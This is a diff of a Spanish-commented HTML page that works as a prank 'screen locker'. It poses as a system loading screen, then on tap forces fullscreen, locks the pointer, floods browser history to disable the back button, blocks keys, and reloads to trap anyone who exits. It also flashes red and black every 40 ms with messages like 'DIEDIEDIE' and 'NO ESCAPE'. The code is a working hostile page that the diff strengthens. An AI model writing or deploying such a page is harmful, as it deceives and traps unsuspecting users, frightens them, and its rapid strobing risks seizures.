@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ SYSTEM FAILURE ⚡</title>
+    <title>⚡ SYSTEM_CRITICAL_FAILURE ⚡</title>
     <style>
-        * { box-sizing: border-box; cursor: none !important; }
+        * { box-sizing: border-box; cursor: none !important; -webkit-tap-highlight-color: transparent; }
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; 
             background-color: #000; color: #f00; 
@@ -13,16 +13,14 @@
             overflow: hidden; touch-action: none;
         }
 
-        /* Pantalla de "Carga" invisible que cubre todo */
+        /* Capa trampa inicial */
         #trigger-layer {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 999999; display: flex; align-items: center; justify-content: center;
-            background: #000; cursor: pointer;
+            z-index: 999999; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: #000; color: #333; cursor: pointer;
         }
 
-        .loading-text { font-size: 1.2rem; color: #333; animation: pulse 2s infinite; }
-
-        /* Capa Killbot */
+        /* Pantalla de Caos */
         #kiosk-mode {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             background-color: #000; display: none; z-index: 100;
@@ -34,21 +32,20 @@
             animation: shake 0.05s infinite; text-transform: uppercase;
         }
 
-        #log { position: absolute; bottom: 0; left: 0; font-size: 10px; color: #0f0; padding: 10px; opacity: 0.6; }
+        #log { position: absolute; bottom: 0; left: 0; font-size: 10px; color: #0f0; padding: 10px; opacity: 0.8; z-index: 101; }
 
         @keyframes shake {
-            0% { transform: translate(5px, 3px); filter: hue-rotate(90deg); }
-            50% { transform: translate(-5px, -3px); filter: hue-rotate(0deg); }
+            0% { transform: translate(5px, 3px) skew(5deg); }
+            50% { transform: translate(-5px, -3px) skew(-5deg); }
             100% { transform: translate(0, 0); }
         }
-
-        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 0.5; } 100% { opacity: 0.2; } }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="trigger-layer">
-        <div class="loading-text">Cargando componentes del sistema...</div>
+    <div id="trigger-layer" onclick="launchKillbot()">
+        <p>Cargando archivos del sistema...</p>
+        <p style="font-size: 10px;">(Toca para continuar)</p>
     </div>
 
     <div id="kiosk-mode">
@@ -64,73 +61,89 @@
         const kiosk = document.getElementById('kiosk-mode');
         const audio = document.getElementById('killbot-audio');
         const log = document.getElementById('log');
-        let virusActive = false;
+        let isActive = false;
 
-        // Función que activa el modo Kiosko Inescapable
-        function startVirus() {
-            virusActive = true;
+        // Función Maestra de Bloqueo
+        function launchKillbot() {
+            isActive = true;
             trigger.style.display = 'none';
             kiosk.style.display = 'block';
 
-            // 1. Forzar Pantalla Completa
-            const el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+            // 1. Forzar Pantalla Completa Inmediata
+            enterFullScreen();
 
             // 2. Bloquear puntero (PC)
             if (document.body.requestPointerLock) document.body.requestPointerLock();
 
-            // 3. Iniciar audio
-            audio.play();
+            // 3. Audio
+            audio.play().catch(() => {});
 
-            // 4. Llenar historial para bloquear botón "Atrás" (Android)
-            for(let i=0; i<100; i++) {
-                history.pushState({hack: true}, "", "#system_corrupted_" + i);
+            // 4. Inundar historial (Bloqueo de botón atrás en Android)
+            for(let i=0; i<150; i++) {
+                history.pushState({virus: true}, "", "#CORRUPTED_SYSTEM_" + i);
             }
 
-            // 5. Iniciar Caos Visual
-            runVisualChaos();
+            startChaos();
         }
 
-        // Cualquier interacción activa el virus
-        window.addEventListener('mousedown', () => { if(!virusActive) startVirus(); });
-        window.addEventListener('touchstart', () => { if(!virusActive) startVirus(); });
-        window.addEventListener('keydown', () => { if(!virusActive) startVirus(); });
+        function enterFullScreen() {
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) doc.requestFullscreen();
+            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+            else if (doc.mozRequestFullScreen) doc.mozRequestFullScreen();
+        }
 
-        function runVisualChaos() {
+        // DETECTAR SI SALE DEL MODO KIOSKO
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && isActive) {
+                // Si intenta salir, forzamos re-entrada al hacer cualquier clic
+                // O mejor aún: recargamos la página para atraparlo de nuevo
+                alert("ERROR: PROCESO CRÍTICO INTERRUMPIDO. RE-EJECUTANDO...");
+                setTimeout(() => {
+                    location.reload(); 
+                }, 100);
+            }
+        });
+
+        // Detectar si intenta cambiar de pestaña o salir (Windows/Android)
+        window.addEventListener('blur', () => {
+            if(isActive) {
+                console.log("Intento de salida detectado");
+                // No podemos evitar que cambie de pestaña, pero podemos hacer que al volver explote
+            }
+        });
+
+        function startChaos() {
             setInterval(() => {
-                // Generar textos aleatorios
                 const t = document.createElement('div');
                 t.className = 'glitch-text';
-                const words = ["KILLBOT", "DIEDIEDIE", "ERROR", "CRITICAL", "NO ESCAPE", "VOID"];
+                const words = ["KILLBOT", "DIEDIEDIE", "NO ESCAPE", "ERROR", "FATAL", "NULL"];
                 t.innerText = words[Math.floor(Math.random() * words.length)];
                 t.style.left = Math.random() * 80 + "vw";
                 t.style.top = Math.random() * 80 + "vh";
                 kiosk.appendChild(t);
-                setTimeout(() => t.remove(), 200);
+                setTimeout(() => t.remove(), 250);
 
-                // Flash agresivo
+                // Flashes de colores
                 kiosk.style.backgroundColor = (Math.random() > 0.5) ? "#f00" : "#000";
                 
-                // Log de terminal
+                // Logs infinitos
                 const l = document.createElement('div');
-                l.innerText = `[FATAL] DELETING_BLOCK_${Math.random().toString(16).toUpperCase().slice(2,10)}`;
+                l.innerText = `[CRITICAL] SECTOR_${Math.random().toString(16).toUpperCase().slice(2,10)}_DELETED`;
                 log.appendChild(l);
-                if(log.childNodes.length > 30) log.removeChild(log.firstChild);
-            }, 45);
+                if(log.childNodes.length > 40) log.removeChild(log.firstChild);
+            }, 40);
         }
 
-        // Re-activar fullscreen si el usuario intenta salir
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement && virusActive) {
-                // Al primer toque después de intentar salir, vuelve a pantalla completa
-                kiosk.innerHTML += '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.5);z-index:999999;display:flex;align-items:center;justify-content:center;font-size:2rem;color:white;">ERROR: ACCESO DENEGADO</div>';
-                setTimeout(() => location.reload(), 1000); // Si intenta salir, reiniciamos el bucle
-            }
+        // Bloqueo de teclas (Windows)
+        window.addEventListener('keydown', (e) => {
+            if(isActive) e.preventDefault();
         });
 
-        // Bloqueo total de salida
-        window.onbeforeunload = () => "DO NOT LEAVE";
+        // Bloqueo de cierre de pestaña
+        window.onbeforeunload = function() {
+            return "SISTEMA COMPROMETIDO. ¿ESTÁS SEGURO?";
+        };
     </script>
 </body>
 </html>
